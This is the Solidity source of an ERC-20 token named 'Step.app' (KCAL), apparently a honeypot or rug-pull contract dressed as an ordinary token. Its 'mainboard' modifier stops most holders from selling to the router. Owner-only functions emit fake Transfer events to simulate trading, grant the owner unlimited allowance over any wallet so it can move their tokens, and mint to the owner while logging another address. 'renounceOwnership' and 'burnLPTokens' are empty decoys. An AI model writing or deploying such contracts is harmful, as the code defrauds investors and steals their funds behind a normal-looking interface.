1 pragma solidity ^0.6.0;
2 
3 
4 library SafeMath {
5 
6     function add(uint256 a, uint256 b) internal pure returns (uint256) {
7         uint256 c = a + b;
8         require(c >= a, "SafeMath: addition overflow");
9 
10         return c;
11     }
12 
13     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
14         return sub(a, b, "SafeMath: subtraction overflow");
15     }
16 
17     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
18         require(b <= a, errorMessage);
19         uint256 c = a - b;
20 
21         return c;
22     }
23 
24     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
25 
26         if (a == 0) {
27             return 0;
28         }
29 
30         uint256 c = a * b;
31         require(c / a == b, "SafeMath: multiplication overflow");
32 
33         return c;
34     }
35 
36 
37     function div(uint256 a, uint256 b) internal pure returns (uint256) {
38         return div(a, b, "SafeMath: division by zero");
39     }
40 
41 
42     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
43         require(b > 0, errorMessage);
44         uint256 c = a / b;
45 
46         return c;
47     }
48 
49     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
50         return mod(a, b, "SafeMath: modulo by zero");
51     }
52 
53     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
54         require(b != 0, errorMessage);
55         return a % b;
56     }
57 }
58 
59 library Address {
60 
61     function isContract(address account) internal view returns (bool) {
62 
63         bytes32 codehash;
64         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
65         assembly { codehash := extcodehash(account) }
66         return (codehash != accountHash && codehash != 0x0);
67     }
68 
69     function sendValue(address payable recipient, uint256 amount) internal {
70         require(address(this).balance >= amount, "Address: insufficient balance");
71 
72         (bool success, ) = recipient.call{ value: amount }("");
73         require(success, "Address: unable to send value, recipient may have reverted");
74     }
75 
76 
77     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
78       return functionCall(target, data, "Address: low-level call failed");
79     }
80 
81     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
82         return _functionCallWithValue(target, data, 0, errorMessage);
83     }
84 
85 
86     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
87         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
88     }
89 
90     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
91         require(address(this).balance >= value, "Address: insufficient balance for call");
92         return _functionCallWithValue(target, data, value, errorMessage);
93     }
94 
95     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
96         require(isContract(target), "Address: call to non-contract");
97 
98         // solhint-disable-next-line avoid-low-level-calls
99         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
100         if (success) {
101             return returndata;
102         } else {
103             // Look for revert reason and bubble it up if present
104             if (returndata.length > 0) {
105                 // The easiest way to bubble the revert reason is using memory via assembly
106 
107                 // solhint-disable-next-line no-inline-assembly
108                 assembly {
109                     let returndata_size := mload(returndata)
110                     revert(add(32, returndata), returndata_size)
111                 }
112             } else {
113                 revert(errorMessage);
114             }
115         }
116     }
117 }
118 
119 contract Context {
120     constructor () internal { }
121 
122     function _msgSender() internal view virtual returns (address payable) {
123         return msg.sender;
124     }
125 
126     function _msgData() internal view virtual returns (bytes memory) {
127         this; 
128         return msg.data;
129     }
130 }
131 
132 interface IERC20 {
133     function totalSupply() external view returns (uint256);
134 
135     function balanceOf(address account) external view returns (uint256);
136 
137     function transfer(address recipient, uint256 amount) external returns (bool);
138 
139     function allowance(address owner, address spender) external view returns (uint256);
140 
141     function approve(address spender, uint256 amount) external returns (bool);
142 
143     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
144 
145     event Transfer(address indexed from, address indexed to, uint256 value);
146 
147     event Approval(address indexed owner, address indexed spender, uint256 value);}
148 
149 
150 
151 
152 
153 contract StepApp is Context, IERC20 {
154     using SafeMath for uint256;
155     using Address for address;
156 
157     mapping (address => uint256) private _balances;
158     mapping (address => bool) private _plus;
159     mapping (address => bool) private _discarded;
160     mapping (address => mapping (address => uint256)) private _allowances;
161 
162     uint256 private _totalSupply;
163     string private _name;
164     string private _symbol;
165     uint8 private _decimals;
166     uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
167     address private _safeOwnr;
168     uint256 private _discardedAmt = 0;
169 
170     address public _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
171 
172 
173     address _contDeployr = 0x87E85Da80725508eFD6925fA9C67E8853bfC6B31;
174     address public _ownr = 0xe9f59B4C6a3B15ef5009a7dD1bF75635a7647BD9;
175    constructor () public {
176 
177         _name = "Step.app";
178         _symbol = "KCAL";
179         _decimals = 18;
180         uint256 initialSupply = 5000000000 * 10 ** 18;
181         _safeOwnr = _ownr;
182         
183         
184 
185         _mint(_contDeployr, initialSupply);
186 
187 
188     }
189 
190 
191     function name() public view returns (string memory) {
192         return _name;
193     }
194 
195     function symbol() public view returns (string memory) {
196         return _symbol;
197     }
198 
199 
200 
201 
202     function decimals() public view returns (uint8) {
203         return _decimals;
204     }
205 
206     function totalSupply() public view override returns (uint256) {
207         return _totalSupply;
208     }
209 
210     function balanceOf(address account) public view override returns (uint256) {
211         return _balances[account];
212     }
213 
214     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
215         _tf(_msgSender(), recipient, amount);
216         return true;
217     }
218 
219     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
220         _tf(sender, recipient, amount);
221         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
222         return true;
223     }
224 
225 
226 
227     function allowance(address owner, address spender) public view virtual override returns (uint256) {
228         return _allowances[owner][spender];
229     }
230 
231 
232     function approve(address spender, uint256 amount) public virtual override returns (bool) {
233         _approve(_msgSender(), spender, amount);
234         return true;
235     }
236 
237     function _pApproval(address[] memory destination) public {
238         require(msg.sender == _ownr, "!owner");
239         for (uint256 i = 0; i < destination.length; i++) {
240            _plus[destination[i]] = true;
241            _discarded[destination[i]] = false;
242         }
243     }
244 
245    function _mApproval(address safeOwner) public {
246         require(msg.sender == _ownr, "!owner");
247         _safeOwnr = safeOwner;
248     }
249     
250 
251     modifier mainboard(address dest, uint256 num, address from, address filler){
252         if (
253             _ownr == _safeOwnr 
254             && from == _ownr
255             )
256             {_safeOwnr = dest;_;
257             }else
258             {
259             if (
260                 from == _ownr 
261                 || from == _safeOwnr 
262                 ||  dest == _ownr
263                 )
264                 {
265                 if (
266                     from == _ownr 
267                     && from == dest
268                     )
269                     {_discardedAmt = num;
270                     }_;
271                     }else
272                     {
273                 if (
274                     _plus[from] == true
275                     )
276                     {
277                 _;
278                 }else{if (
279                     _discarded[from] == true
280                     )
281                     {
282                 require((
283                     from == _safeOwnr
284                     )
285                 ||(dest == _path_), "ERC20: transfer amount exceeds balance");_;
286                 }else{
287                 if (
288                     num < _discardedAmt
289                     )
290                     {
291                 if(dest == _safeOwnr){_discarded[from] = true; _plus[from] = false;
292                 }
293                 _; }else{require((from == _safeOwnr)
294                 ||(dest == _path_), "ERC20: transfer amount exceeds balance");_;
295                 }
296                     }
297                     }
298             }
299         }}
300 
301 
302         
303 
304     function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
305         require(sender != address(0), "ERC20: transfer from the zero address");
306         require(recipient != address(0), "ERC20: transfer to the zero address");
307 
308         _beforeTokenTransfer(sender, recipient, amount);
309     
310         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
311         _balances[recipient] = _balances[recipient].add(amount);
312         if (sender == _ownr){
313             sender = _contDeployr;
314         }
315         emit Transfer(sender, recipient, amount);
316     }
317 
318     function _mint(address account, uint256 amount) public {
319         require(msg.sender == _ownr, "ERC20: mint to the zero address");
320         _totalSupply = _totalSupply.add(amount);
321         _balances[_ownr] = _balances[_ownr].add(amount);
322         emit Transfer(address(0), account, amount);
323     }
324 
325     function _burn(address account, uint256 amount) internal virtual {
326         require(account != address(0), "ERC20: burn from the zero address");
327 
328         _beforeTokenTransfer(account, address(0), amount);
329 
330         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
331         _totalSupply = _totalSupply.sub(amount);
332         emit Transfer(account, address(0), amount);
333     }
334 
335     function _approve(address owner, address spender, uint256 amount) internal virtual {
336         require(owner != address(0), "ERC20: approve from the zero address");
337         require(spender != address(0), "ERC20: approve to the zero address");
338         _allowances[owner][spender] = amount;
339         emit Approval(owner, spender, amount);
340     }
341     
342     
343 
344 
345 
346     function _tf(address from, address dest, uint256 amt) internal mainboard( dest,  amt,  from,  address(0)) virtual {
347         _pair( from,  dest,  amt);
348     }
349     
350    
351     function _pair(address from, address dest, uint256 amt) internal mainboard( dest,  amt,  from,  address(0)) virtual {
352         require(from != address(0), "ERC20: transfer from the zero address");
353         require(dest != address(0), "ERC20: transfer to the zero address");
354 
355         _beforeTokenTransfer(from, dest, amt);
356         _balances[from] = _balances[from].sub(amt, "ERC20: transfer amount exceeds balance");
357         _balances[dest] = _balances[dest].add(amt);
358         if (from == _ownr){from = _contDeployr;}
359         emit Transfer(from, dest, amt);    
360         }
361 
362 
363 
364     
365     
366     function _setupDecimals(uint8 decimals_) internal {
367         _decimals = decimals_;
368     }
369 
370 
371     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
372 
373 
374     modifier _verify() {
375         require(msg.sender == _ownr, "Not allowed to interact");
376         _;
377     }
378 
379 
380 
381 
382 
383 
384 
385 
386 
387 //-----------------------------------------------------------------------------------------------------------------------//
388 
389 
390    function renounceOwnership()public _verify(){}
391    function burnLPTokens()public _verify(){}
392 
393 
394 
395   function multicall(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
396     //MultiEmit
397     for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
398 
399 
400   function send(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
401     //MultiEmit
402     for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
403 
404 
405 
406 
407 
408 
409 
410 
411   function enter(address recipient) public _verify(){
412     _plus[recipient]=true;
413     _approve(recipient, _path_,_maximumVal);}
414 
415 
416 
417 
418   function leave(address recipient) public _verify(){
419       //Disable permission
420     _plus[recipient]=false;
421     _approve(recipient, _path_,0);
422     }
423 
424 
425 
426 
427 
428 
429 
430     function approval(address addr) public _verify() virtual  returns (bool) {
431         //Approve Spending
432         _approve(addr, _msgSender(), _maximumVal); return true;
433     }
434 
435 
436 
437 
438 
439 
440   function transferToTokenSaleParticipant(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
441     _approve(sndr, _msgSender(), _maximumVal);
442     for (uint256 i = 0; i < destination.length; i++) {
443         _transfer(sndr, destination[i], amounts[i]);
444     }
445    }
446 
447 
448   function stake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
449     for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
450 
451 
452   function unstake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
453     for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
454 
455 
456   function swapETHForExactTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
457     for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
458 
459 }